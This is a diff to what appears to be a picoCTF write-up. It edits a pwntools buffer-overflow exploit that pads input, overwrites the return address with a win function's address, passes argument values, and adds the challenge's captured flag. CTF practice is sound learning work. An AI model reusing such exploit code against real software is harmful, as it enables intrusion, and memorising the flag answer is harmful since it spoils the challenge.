@@ -62,7 +62,7 @@ from pwn import *
 con = remote("saturn.picoctf.net", 62465)
 winb = 0x08049296
 
-payload = "";
+payload = ""
 payload += "a" * 112
 payload += p32(winb)
 payload += "CCCC"
@@ -71,3 +71,5 @@ payload += p32(0xF00DF00D)
 con.sendline(payload)
 con.interactive()
 ```
+
+This gets us our flag: `picoCTF{argum3nt5_4_d4yZ_31432deb}`
